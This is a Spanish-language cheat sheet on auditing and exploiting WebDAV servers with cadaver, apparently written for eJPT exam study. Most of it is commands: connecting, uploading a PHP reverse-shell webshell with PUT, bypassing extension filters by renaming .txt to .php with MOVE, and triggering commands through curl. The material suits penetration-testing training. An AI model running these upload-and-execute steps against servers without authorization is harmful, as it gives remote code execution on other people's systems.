# Cadaver (WebDAV) Cheat Sheet & Guía Detallada

Guía completa y explicada para la auditoría y explotación de servicios **WebDAV** (puertos 80/443 HTTP/HTTPS) utilizando **cadaver**.

---

## 1. ¿Qué es cadaver y para qué sirve en Pentesting?

**cadaver** es un cliente de línea de comandos para el protocolo **WebDAV** (Web Distributed Authoring and Versioning). WebDAV es una extensión de HTTP que permite a los usuarios editar y gestionar archivos directamente en el servidor web remoto.

En auditorías de seguridad y en el examen **eJPT v2**, WebDAV es un vector de ataque crítico: si un directorio web tiene WebDAV habilitado y permite métodos como `PUT` y `MOVE`, se puede utilizar `cadaver` para subir un **webshell** (PHP, ASPX, JSP) y lograr **ejecución remota de comandos (RCE)**.

---

## 2. Sintaxis Básica y Conexión

```bash
# Conexión anónima / sin credenciales a un directorio WebDAV
cadaver http://<IP_OBJETIVO>/webdav/

# Conexión con credenciales conocidas
cadaver -u <USUARIO> -p <PASSWORD> http://<IP_OBJETIVO>/webdav/

# Conexión HTTPS ignorando certificados SSL/TLS inválidos
cadaver https://<IP_OBJETIVO>/webdav/
```

### Opciones de línea de comandos:
* `-u <USUARIO>` : Especificar nombre de usuario.
* `-p <PASSWORD>` : Especificar contraseña.
* `-V` / `--version` : Mostrar versión de cadaver.

---

## 3. Comandos Internos en la Consola Interactiva de Cadaver

Una vez establecida la conexión (prompt `dav:/webdav/>`), puedes usar los siguientes comandos:

| Comando | Descripción Explicada | Ejemplo de Uso |
| :--- | :--- | :--- |
| `ls` / `dir` | Listar archivos y directorios en el servidor WebDAV remoto. | `ls` |
| `put <ARCHIVO_LOCAL>` | **Subir un archivo** desde tu máquina atacante al servidor. | `put shell.php` |
| `get <ARCHIVO_REMOTO>` | **Descargar un archivo** del servidor a tu máquina atacante. | `get config.php` |
| `move <ORIGEN> <DESTINO>` | **Renombrar o mover** un archivo en el servidor remoto. | `move shell.txt shell.php` |
| `copy <ORIGEN> <DESTINO>` | Copiar un archivo remoto a otra ubicación. | `copy file.txt backup.txt` |
| `delete <ARCHIVO>` | Eliminar un archivo del servidor remoto. | `delete shell.php` |
| `mkcol <CARPETA>` | Crear un nuevo directorio (Make Collection). | `mkcol uploads` |
| `rmcol <CARPETA>` | Eliminar un directorio remoto. | `rmcol uploads` |
| `edit <ARCHIVO>` | Editar directamente un archivo remoto en el servidor. | `edit index.html` |
| `exit` / `quit` | Cerrar la sesión de cadaver y salir. | `quit` |

---

## 4. Flujo de Explotación WebDAV para RCE (Paso a Paso)

### Escenario A: Subida Directa de Webshell PHP / ASPX

1. **Conectarse al directorio WebDAV**:
   ```bash
   cadaver http://10.10.10.50/webdav/
   ```
2. **Subir el webshell PHP**:
   ```text
   dav:/webdav/> put /usr/share/webshells/php/php-reverse-shell.php
   ```
3. **Navegar en el navegador web o activar la shell vía HTTP**:
   ```bash
   curl http://10.10.10.50/webdav/php-reverse-shell.php
   ```

---

### Escenario B: Bypass de Restricción de Extensiones mediante `MOVE`

Si el servidor WebDAV bloquea la subida directa de archivos `.php` o `.aspx` mediante la directiva `PUT`:

1. **Subir el webshell con una extensión permitida (ej. `.txt` o `.jpg`)**:
   ```text
   dav:/webdav/> put shell.txt
   ```
2. **Renombrar el archivo subido a extensión `.php` usando el comando `move`**:
   ```text
   dav:/webdav/> move shell.txt shell.php
   ```
   *(Frecuentemente el servidor restringe la subida por `PUT`, pero NO valida el cambio de extensión vía el comando `MOVE`)*.
3. **Ejecutar la shell**:
   ```bash
   curl http://10.10.10.50/webdav/shell.php?cmd=whoami
   ```

---

## 5. Herramientas Complementarias para WebDAV

### A. `davtest` (Escaneo y Verificación Automática de WebDAV)
Herramienta en Kali para auditar qué extensiones se pueden subir en un servicio WebDAV de forma automática.

```bash
# Probar subida automática de múltiples formatos (php, txt, html, cgi)
davtest -url http://<IP_OBJETIVO>/webdav/

# Con credenciales
davtest -url http://<IP_OBJETIVO>/webdav/ -auth usuario:contraseña
```

### B. Subida Manual con `curl` (Si no tienes `cadaver` instalado)
```bash
# Subir un archivo usando el método HTTP PUT
curl -X PUT http://<IP_OBJETIVO>/webdav/shell.php -d @shell.php

# Renombrar archivo usando el método HTTP MOVE
curl -X MOVE -H "Destination: http://<IP_OBJETIVO>/webdav/shell.php" http://<IP_OBJETIVO>/webdav/shell.txt
```
